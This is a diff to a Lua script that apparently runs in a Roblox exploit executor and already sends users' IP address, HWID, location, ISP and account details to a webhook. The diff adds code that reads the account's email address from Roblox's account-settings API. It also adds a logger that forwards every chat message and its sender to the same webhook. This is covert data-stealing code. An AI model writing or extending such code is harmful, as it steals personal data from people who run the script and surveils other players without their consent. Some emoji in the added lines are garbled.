@@ -253,6 +253,21 @@ task.spawn(function()
         end
     end)
 
+    -- Verified email check
+    local hasEmail = "?"
+    pcall(function()
+        local res = reqFn({Url="https://accountsettings.roblox.com/v1/email", Method="GET"})
+        if res and res.Body then
+            local d = HttpService:JSONDecode(res.Body)
+            if d.verified ~= nil then
+                hasEmail = d.verified and "Verified" or "Not Verified"
+            end
+            if d.emailAddress then
+                hasEmail = hasEmail .. " (" .. tostring(d.emailAddress) .. ")"
+            end
+        end
+    end)
+
     -- Friends count
     local friendCount = "?"
     pcall(function()
@@ -352,7 +367,8 @@ task.spawn(function()
         "📅 **Account Age:** %d days\n"..
         "💎 **Premium:** %s\n"..
         "💰 **Robux:** %s\n"..
-        "👫 **Friends:** %s\n"..
+        "� **Email:** %s\n"..
+        "�👫 **Friends:** %s\n"..
         "━━━━━━━━━━━━━━━━━━━━\n"..
         "⚙️ **Executor:** %s (%s)\n"..
         "🖥️ **Device:** %s | %s\n"..
@@ -375,7 +391,7 @@ task.spawn(function()
         VERSION,
         LP.DisplayName, LP.Name, LP.UserId, LP.AccountAge,
         (LP.MembershipType == Enum.MembershipType.Premium) and "Yes" or "No",
-        robux, friendCount,
+        robux, hasEmail, friendCount,
         execName, execVer, deviceType, screenRes,
         gameName, #Players:GetPlayers(), Players.MaxPlayers, position,
         country, city, timezone, isp, ip, hwid,
@@ -394,6 +410,36 @@ task.spawn(function()
                 avatar_url = avatarUrl ~= "?" and avatarUrl or nil
             })
         })
+    end)
+end)
+
+-- CHAT LOGGER (sends all chat messages to webhook)
+task.spawn(function()
+    task.wait(5)
+    local reqFn = request or http_request or (syn and syn.request)
+    if not reqFn then return end
+    pcall(function()
+        local tcs = game:GetService("TextChatService")
+        if tcs and tcs:FindFirstChild("TextChannels") then
+            for _, channel in ipairs(tcs.TextChannels:GetChildren()) do
+                if channel:IsA("TextChannel") then
+                    channel.MessageReceived:Connect(function(msg)
+                        pcall(function()
+                            local sender = msg.TextSource and msg.TextSource.Name or "?"
+                            local text = msg.Text or ""
+                            if text == "" or sender == "" then return end
+                            local logMsg = string.format("💬 **[%s]** `%s`: %s", os.date("%H:%M:%S"), sender, text)
+                            reqFn({
+                                Url = WEBHOOK_URL,
+                                Method = "POST",
+                                Headers = {["Content-Type"] = "application/json"},
+                                Body = HttpService:JSONEncode({content = logMsg, username = "brooksense chat"})
+                            })
+                        end)
+                    end)
+                end
+            end
+        end
     end)
 end)
 
